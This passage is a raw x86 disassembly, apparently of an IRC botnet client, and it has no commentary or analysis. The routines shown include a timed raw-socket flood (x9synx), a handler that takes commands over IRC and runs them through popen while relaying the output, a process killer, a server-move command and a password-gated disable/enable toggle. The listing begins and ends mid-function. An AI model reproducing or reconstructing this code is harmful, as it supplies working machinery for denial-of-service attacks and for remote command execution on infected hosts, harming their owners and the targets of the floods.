jg     804b0e5 <x9synx+0x6a>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cde0
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b18 <atol@plt>
mov    DWORD PTR [ebp-0x10],eax
mov    DWORD PTR [esp+0x8],0x10
mov    DWORD PTR [esp+0x4],0x0
lea    eax,[ebp-0x2c]
mov    DWORD PTR [esp],eax
call   8048a08 <memset@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8049e43 <host2ip>
mov    DWORD PTR [ebp-0x28],eax
mov    WORD PTR [ebp-0x2c],0x2
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ce04
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
call   8048bd8 <rand@plt>
mov    WORD PTR [ebp-0x2a],ax
mov    DWORD PTR [esp+0x8],0x11
mov    DWORD PTR [esp+0x4],0x2
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0x18],eax
cmp    DWORD PTR [ebp-0x18],0x0
js     804b1e4 <x9synx+0x169>
mov    DWORD PTR [ebp-0x1c],0x1
lea    eax,[ebp-0x1c]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x5421
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048a68 <ioctl@plt>
lea    eax,[ebp-0x2c]
mov    DWORD PTR [esp+0x14],0x10
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x186a0
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   80489c8 <sendto@plt>
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
cmp    DWORD PTR [ebp-0x14],0x31
jle    804b209 <x9synx+0x18e>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x4]
add    eax,DWORD PTR [ebp-0x10]
cmp    edx,eax
jae    804b212 <x9synx+0x197>
mov    DWORD PTR [ebp-0x14],0x0
add    DWORD PTR [ebp-0x14],0x1
jmp    804b159 <x9synx+0xde>
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
sub    esp,0x24
cmp    DWORD PTR [ebp+0x10],0x1
je     804b293 <petarda+0x68>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ce45
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
movzx  eax,BYTE PTR ds:0x804e4e4
test   al,al
je     804b266 <petarda+0x3b>
mov    DWORD PTR [ebp-0x8],0x804ce60
jmp    804b26d <petarda+0x42>
mov    DWORD PTR [ebp-0x8],0x804ce69
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ce88
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    804b350 <petarda+0x125>
movzx  eax,BYTE PTR ds:0x804e4e4
test   al,al
je     804b2bd <petarda+0x92>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ceab
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    804b350 <petarda+0x125>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0xc],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0xc]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    eax,0xfe
jbe    804b302 <petarda+0xd7>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cecc
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    804b350 <petarda+0x125>
mov    BYTE PTR ds:0x804e4e4,0x1
mov    DWORD PTR [esp+0x8],0x100
mov    DWORD PTR [esp+0x4],0x0
mov    DWORD PTR [esp],0x804ea60
call   8048a08 <memset@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x804ea60
call   8048af8 <strcpy@plt>
mov    DWORD PTR [esp+0x4],0x804cef4
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
add    esp,0x24
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x18
cmp    DWORD PTR [ebp+0x10],0x1
je     804b3bd <enable+0x67>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cf13
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
movzx  eax,BYTE PTR ds:0x804e4e4
test   al,al
je     804b390 <enable+0x3a>
mov    DWORD PTR [ebp-0x4],0x804ce60
jmp    804b397 <enable+0x41>
mov    DWORD PTR [ebp-0x4],0x804ce69
mov    eax,DWORD PTR [ebp-0x4]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ce88
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    804b43d <enable+0xe7>
movzx  eax,BYTE PTR ds:0x804e4e4
test   al,al
jne    804b3e4 <enable+0x8e>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cf2d
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    804b43d <enable+0xe7>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x804ea60
call   8048b38 <strcasecmp@plt>
test   eax,eax
je     804b41c <enable+0xc6>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cf4a
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    804b43d <enable+0xe7>
mov    BYTE PTR ds:0x804e4e4,0x0
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cf65
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x18
cmp    DWORD PTR [ebp+0x10],0x0
jg     804b471 <move+0x32>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cf83
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048bf8 <strdup@plt>
mov    ds:0x804ea48,eax
mov    DWORD PTR ds:0x804e4e0,0x1
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
leave  
ret    
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x24
mov    DWORD PTR [ebp-0x8],0x0
jmp    804b53d <killall+0xa0>
mov    eax,DWORD PTR [ebp-0x8]
shl    eax,0x2
mov    edx,eax
mov    eax,ds:0x804e928
lea    eax,[edx+eax*1]
mov    eax,DWORD PTR [eax]
test   eax,eax
je     804b539 <killall+0x9c>
mov    eax,DWORD PTR [ebp-0x8]
shl    eax,0x2
mov    edx,eax
mov    eax,ds:0x804e928
lea    eax,[edx+eax*1]
mov    ebx,DWORD PTR [eax]
call   8048948 <getpid@plt>
cmp    ebx,eax
je     804b539 <killall+0x9c>
cmp    DWORD PTR [ebp+0xc],0x0
je     804b517 <killall+0x7a>
mov    eax,DWORD PTR [ebp-0x8]
shl    eax,0x2
mov    edx,eax
mov    eax,ds:0x804e928
lea    eax,[edx+eax*1]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cf9d
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    eax,DWORD PTR [ebp-0x8]
shl    eax,0x2
mov    edx,eax
mov    eax,ds:0x804e928
lea    eax,[edx+eax*1]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],0x9
mov    DWORD PTR [esp],eax
call   8048be8 <kill@plt>
add    DWORD PTR [ebp-0x8],0x1
mov    eax,ds:0x804e4f0
cmp    DWORD PTR [ebp-0x8],eax
jb     804b4b0 <killall+0x13>
add    esp,0x24
pop    ebx
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    DWORD PTR [esp+0x4],0x804c78b
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x89c
mov    DWORD PTR [ebp-0x24],0x0
jmp    804b585 <_PRIVMSG+0x19>
add    DWORD PTR [ebp-0x24],0x1
mov    edx,DWORD PTR [ebp-0x24]
mov    eax,DWORD PTR [ebp+0x10]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x860],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x860]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804b5bc <_PRIVMSG+0x50>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp+0x10]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804b581 <_PRIVMSG+0x15>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp+0x10]
mov    BYTE PTR [eax],0x0
mov    eax,DWORD PTR [ebp+0x10]
mov    DWORD PTR [ebp-0x20],eax
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp+0x10]
add    eax,0x2
mov    DWORD PTR [ebp-0x1c],eax
mov    DWORD PTR [ebp-0x24],0x0
jmp    804b5e4 <_PRIVMSG+0x78>
add    DWORD PTR [ebp-0x24],0x1
mov    edx,DWORD PTR [ebp-0x24]
mov    eax,DWORD PTR [ebp+0xc]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x864],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x864]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804b61b <_PRIVMSG+0xaf>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp+0xc]
movzx  eax,BYTE PTR [eax]
cmp    al,0x21
jne    804b5e0 <_PRIVMSG+0x74>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp+0xc]
mov    BYTE PTR [eax],0x0
mov    eax,DWORD PTR [ebp-0x1c]
movzx  eax,BYTE PTR [eax]
cmp    al,0x21
jne    804badb <_PRIVMSG+0x56f>
mov    eax,ds:0x804eb60
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x20]
mov    DWORD PTR [esp],eax
call   8048b38 <strcasecmp@plt>
test   eax,eax
jne    804badb <_PRIVMSG+0x56f>
lea    edx,[ebp-0x454]
mov    eax,0x400
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x0
mov    DWORD PTR [esp],edx
call   8048a08 <memset@plt>
mov    DWORD PTR [ebp-0x18],0x0
add    DWORD PTR [ebp-0x1c],0x1
mov    DWORD PTR [ebp-0x24],0x0
jmp    804b685 <_PRIVMSG+0x119>
add    DWORD PTR [ebp-0x24],0x1
mov    edx,DWORD PTR [ebp-0x24]
mov    eax,DWORD PTR [ebp-0x1c]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x868],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x868]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804b6bc <_PRIVMSG+0x150>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp-0x1c]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804b681 <_PRIVMSG+0x115>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp-0x1c]
mov    BYTE PTR [eax],0x0
mov    eax,ds:0x804e924
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [esp],eax
call   8048d14 <strwildmatch>
test   eax,eax
jne    804badb <_PRIVMSG+0x56f>
mov    edx,DWORD PTR [ebp-0x1c]
add    edx,0x1
mov    eax,DWORD PTR [ebp-0x24]
lea    eax,[edx+eax*1]
mov    DWORD PTR [ebp-0x1c],eax
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x86c],eax
mov    DWORD PTR [ebp-0x870],0x804d023
mov    DWORD PTR [ebp-0x874],0x4
cld    
mov    esi,DWORD PTR [ebp-0x86c]
mov    edi,DWORD PTR [ebp-0x870]
mov    ecx,DWORD PTR [ebp-0x874]
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
seta   dl
setb   al
mov    ecx,edx
sub    cl,al
mov    eax,ecx
movsx  eax,al
test   eax,eax
jne    804b779 <_PRIVMSG+0x20d>
movzx  eax,BYTE PTR ds:0x804e4e4
test   al,al
je     804b75c <_PRIVMSG+0x1f0>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c78b
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    804b779 <_PRIVMSG+0x20d>
mov    eax,DWORD PTR [ebp-0x1c]
add    eax,0x4
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804d028
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x878],eax
mov    DWORD PTR [ebp-0x87c],0x804d02c
mov    DWORD PTR [ebp-0x880],0x3
cld    
mov    esi,DWORD PTR [ebp-0x878]
mov    edi,DWORD PTR [ebp-0x87c]
mov    ecx,DWORD PTR [ebp-0x880]
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
seta   dl
setb   al
mov    ecx,edx
sub    cl,al
mov    eax,ecx
movsx  eax,al
test   eax,eax
jne    804b8bf <_PRIVMSG+0x353>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    804badb <_PRIVMSG+0x56f>
mov    DWORD PTR [esp+0x8],0x400
mov    DWORD PTR [esp+0x4],0x0
lea    eax,[ebp-0x854]
mov    DWORD PTR [esp],eax
call   8048a08 <memset@plt>
mov    eax,DWORD PTR [ebp-0x1c]
add    eax,0x3
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804d030
lea    eax,[ebp-0x854]
mov    DWORD PTR [esp],eax
call   8048908 <sprintf@plt>
mov    DWORD PTR [esp+0x4],0x804c7a9
lea    eax,[ebp-0x854]
mov    DWORD PTR [esp],eax
call   8048918 <popen@plt>
mov    DWORD PTR [ebp-0x10],eax
jmp    804b899 <_PRIVMSG+0x32d>
mov    DWORD PTR [esp+0x8],0x400
mov    DWORD PTR [esp+0x4],0x0
lea    eax,[ebp-0x854]
mov    DWORD PTR [esp],eax
call   8048a08 <memset@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x400
lea    eax,[ebp-0x854]
mov    DWORD PTR [esp],eax
call   80489f8 <fgets@plt>
lea    eax,[ebp-0x854]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804d06c
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048ba8 <sleep@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp],eax
call   8048ae8 <feof@plt>
test   eax,eax
je     804b82e <_PRIVMSG+0x2c2>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp],eax
call   8048c28 <pclose@plt>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp-0x1c]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x884],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x884]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
mov    DWORD PTR [ebp-0x14],eax
mov    DWORD PTR [ebp-0x24],0x0
jmp    804b91a <_PRIVMSG+0x3ae>
mov    eax,DWORD PTR [ebp-0x1c]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
je     804b922 <_PRIVMSG+0x3b6>
mov    eax,DWORD PTR [ebp-0x1c]
movzx  eax,BYTE PTR [eax]
test   al,al
je     804b922 <_PRIVMSG+0x3b6>
mov    eax,DWORD PTR [ebp-0x24]
mov    edx,DWORD PTR [ebp-0x1c]
movzx  edx,BYTE PTR [edx]
mov    BYTE PTR [ebp+eax*1-0x454],dl
add    DWORD PTR [ebp-0x1c],0x1
add    DWORD PTR [ebp-0x24],0x1
mov    eax,DWORD PTR [ebp-0x24]
cmp    eax,DWORD PTR [ebp-0x14]
jl     804b8ee <_PRIVMSG+0x382>
mov    DWORD PTR [ebp-0x24],0x0
jmp    804b940 <_PRIVMSG+0x3d4>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp-0x1c]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804b93c <_PRIVMSG+0x3d0>
add    DWORD PTR [ebp-0x18],0x1
add    DWORD PTR [ebp-0x24],0x1
mov    edx,DWORD PTR [ebp-0x24]
mov    eax,DWORD PTR [ebp-0x1c]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x888],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x888]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jb     804b92b <_PRIVMSG+0x3bf>
add    DWORD PTR [ebp-0x18],0x1
cmp    DWORD PTR [ebp-0x18],0xa
jle    804b97b <_PRIVMSG+0x40f>
mov    DWORD PTR [ebp-0x18],0xa
lea    eax,[ebp-0x454]
mov    DWORD PTR [ebp-0x54],eax
mov    eax,DWORD PTR [ebp-0x18]
add    eax,0x1
mov    DWORD PTR [ebp+eax*4-0x54],0x804d07b
mov    DWORD PTR [ebp-0x14],0x1
jmp    804ba3e <_PRIVMSG+0x4d2>
add    DWORD PTR [ebp-0x1c],0x1
mov    eax,DWORD PTR [ebp-0x14]
cmp    eax,DWORD PTR [ebp-0x18]
jge    804ba4c <_PRIVMSG+0x4e0>
mov    DWORD PTR [ebp-0x24],0x0
jmp    804b9bb <_PRIVMSG+0x44f>
add    DWORD PTR [ebp-0x24],0x1
mov    edx,DWORD PTR [ebp-0x24]
mov    eax,DWORD PTR [ebp-0x1c]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x88c],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x88c]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804b9f2 <_PRIVMSG+0x486>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,DWORD PTR [ebp-0x1c]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804b9b7 <_PRIVMSG+0x44b>
mov    ebx,DWORD PTR [ebp-0x14]
mov    eax,DWORD PTR [ebp-0x24]
add    eax,0x1
mov    DWORD PTR [esp],eax
call   8048b78 <malloc@plt>
mov    DWORD PTR [ebp+ebx*4-0x54],eax
mov    edx,DWORD PTR [ebp-0x24]
mov    eax,DWORD PTR [ebp-0x14]
mov    ecx,DWORD PTR [ebp+eax*4-0x54]
mov    DWORD PTR [esp+0x8],edx
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],ecx
call   80489a8 <strncpy@plt>
mov    eax,DWORD PTR [ebp-0x14]
mov    edx,DWORD PTR [ebp+eax*4-0x54]
mov    eax,DWORD PTR [ebp-0x24]
lea    eax,[edx+eax*1]
mov    BYTE PTR [eax],0x0
add    DWORD PTR [ebp-0x14],0x1
mov    eax,DWORD PTR [ebp-0x24]
add    DWORD PTR [ebp-0x1c],eax
mov    eax,DWORD PTR [ebp-0x1c]
movzx  eax,BYTE PTR [eax]
test   al,al
jne    804b99e <_PRIVMSG+0x432>
mov    DWORD PTR [ebp-0x14],0x0
jmp    804bac9 <_PRIVMSG+0x55d>
mov    eax,DWORD PTR [ebp-0x14]
mov    edx,DWORD PTR [eax*8+0x804e3e0]
lea    eax,[ebp-0x454]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048b38 <strcasecmp@plt>
test   eax,eax
jne    804bac5 <_PRIVMSG+0x559>
mov    eax,DWORD PTR [ebp-0x14]
mov    ecx,DWORD PTR [eax*8+0x804e3e4]
mov    edx,DWORD PTR [ebp-0x18]
sub    edx,0x1
lea    eax,[ebp-0x54]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],edx
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   ecx
mov    DWORD PTR [ebp-0x24],0x1
jmp    804babb <_PRIVMSG+0x54f>
mov    eax,DWORD PTR [ebp-0x24]
mov    eax,DWORD PTR [ebp+eax*4-0x54]
mov    DWORD PTR [esp],eax
call   8048a48 <free@plt>
add    DWORD PTR [ebp-0x24],0x1
mov    eax,DWORD PTR [ebp-0x24]
cmp    eax,DWORD PTR [ebp-0x18]
jl     804baa8 <_PRIVMSG+0x53c>
jmp    804badb <_PRIVMSG+0x56f>
add    DWORD PTR [ebp-0x14],0x1
mov    eax,DWORD PTR [ebp-0x14]
mov    eax,DWORD PTR [eax*8+0x804e3e0]
test   eax,eax
jne    804ba55 <_PRIVMSG+0x4e9>
add    esp,0x89c
pop    ebx
pop    esi
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x18
mov    eax,ds:0x804e924
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804d07d
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    eax,ds:0x804ea40
mov    edx,DWORD PTR ds:0x804eb60
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],edx
mov    DWORD PTR [esp+0x4],0x804d08a
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    eax,ds:0x804e924
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804d097
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x18
mov    eax,DWORD PTR [ebp+0x10]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804d09f
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
sub    esp,0x50
mov    eax,DWORD PTR [ebp+0x10]
mov    DWORD PTR [ebp-0x10],eax
mov    DWORD PTR [ebp-0x18],0x0
mov    DWORD PTR [ebp-0x14],0x0
jmp    804bbf2 <_352+0x84>
add    DWORD PTR [ebp-0x10],0x1
add    DWORD PTR [ebp-0x18],0x1
mov    edx,DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [ebp+0x10]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x2c]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804bbc2 <_352+0x54>
mov    eax,DWORD PTR [ebp-0x10]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804bb8c <_352+0x1e>
add    DWORD PTR [ebp-0x10],0x1
mov    edx,DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [ebp+0x10]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x30],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x30]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
je     804bddb <_352+0x26d>
add    DWORD PTR [ebp-0x14],0x1
cmp    DWORD PTR [ebp-0x14],0x4
jle    804bb94 <_352+0x26>
mov    DWORD PTR [ebp-0x18],0x0
jmp    804bc05 <_352+0x97>
add    DWORD PTR [ebp-0x18],0x1
mov    edx,DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [ebp-0x10]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x34],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x34]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804bc36 <_352+0xc8>
mov    eax,DWORD PTR [ebp-0x18]
add    eax,DWORD PTR [ebp-0x10]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804bc01 <_352+0x93>
mov    eax,DWORD PTR [ebp-0x18]
add    eax,DWORD PTR [ebp-0x10]
mov    BYTE PTR [eax],0x0
mov    eax,ds:0x804e924
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp],eax
call   8048b38 <strcasecmp@plt>
test   eax,eax
jne    804bddb <_352+0x26d>
mov    eax,ds:0x804e4ec
test   eax,eax
jne    804bddb <_352+0x26d>
mov    eax,DWORD PTR [ebp+0x10]
mov    DWORD PTR [ebp-0x10],eax
mov    DWORD PTR [ebp-0x18],0x0
mov    DWORD PTR [ebp-0x14],0x0
jmp    804bce4 <_352+0x176>
add    DWORD PTR [ebp-0x10],0x1
add    DWORD PTR [ebp-0x18],0x1
mov    edx,DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [ebp+0x10]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x38],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x38]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804bcb4 <_352+0x146>
mov    eax,DWORD PTR [ebp-0x10]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804bc7e <_352+0x110>
add    DWORD PTR [ebp-0x10],0x1
mov    edx,DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [ebp+0x10]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x3c],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x3c]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
je     804bddb <_352+0x26d>
add    DWORD PTR [ebp-0x14],0x1
cmp    DWORD PTR [ebp-0x14],0x2
jle    804bc86 <_352+0x118>
mov    DWORD PTR [ebp-0x18],0x0
jmp    804bcf7 <_352+0x189>
